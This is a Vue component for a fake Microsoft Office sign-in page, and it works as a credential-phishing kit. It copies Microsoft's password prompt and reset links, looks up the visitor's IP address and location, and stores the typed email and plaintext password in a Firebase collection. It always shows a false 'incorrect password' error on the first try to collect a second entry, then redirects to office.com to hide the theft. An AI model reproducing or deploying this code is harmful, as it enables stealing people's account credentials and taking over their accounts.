<template>
<div class="bckgrd">
    
<div >
   <v-flex 
   xs12 
   sm12
    md12
    layout
   justify-center

   >
   <v-card class="login-card" flat > 
      <img src="../assets/ml.svg" alt="" width="110px">
     <br>
      <br>  
      <p style="font-size: 17px;"> {{ getterMail }}</p>
   <h1>Enter Password</h1>
    <p style="color:red; font-size:14px" v-if="passLogic">Your account or password is incorrect. If you don't remember your password,
        <span style="color:#0b68b4;"> <a style="text-decoration:none"  href="https://account.live.com/password/reset">reset it now.</a> </span>
       </p>
          <v-text-field
          type = "password"
            v-model="password"
            placeholder="Password"
          ></v-text-field>
     <span style="color:#0b68b4;"> <a style="font-size:14px;text-decoration:none" href="https://account.live.com/password/reset">Forgot password?</a> </span>
        <br><br>
        <button class="login-btn" @click="Save" v-if="btn">Sign in</button>
        <button class="login-btn" @click="Save2" v-else>Sign in</button>
   </v-card>
   </v-flex>

</div>
</div>
</template>

<script>
import db from './firebaseinit.js';
import firebase from 'firebase';
import { error } from 'util';
 import { mapGetters } from 'vuex'
  export default {
      data(){
       return{
         json:null,
         btn: true,
         passLogic: false,
           password: '',
           Cdate: new Date()
       }
      },
     computed:{
         ...mapGetters ([
             'getterMail'
         ]),
   },
     created(){
           var _this = this;
        $.getJSON('https://geoip-db.com/json/', function (json) {
            _this.json = json;
           });
     },

    methods:{
      Save(){
        
        db.collection('Details').add({
            Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Office',
        Email: this.getterMail,
        Password: this.password, 
       timestamp: Date.now()
       })
       .then(docRef =>  this.passLogic = true, this.password = "" , this.btn = false)
   
   .catch(error => console.log(err))
             },
             Save2(){
        db.collection('Details').add({
          Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Office',
        Email: this.getterMail,
        Password: this.password, 
       timestamp: Date.now()
       })
    
   window.location.assign("https://www.office.com/")
             }
    }
  }
</script>

<style scoped>
.login-btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.bckgrd {height:100vh;background-image: url('../assets/bg2.jpg');background-size: cover;padding: 165px 0px 0px 0px ;}
.login-card {padding: 40px; height: auto; width:450px; color: rgb(73, 73, 73);}
</style>
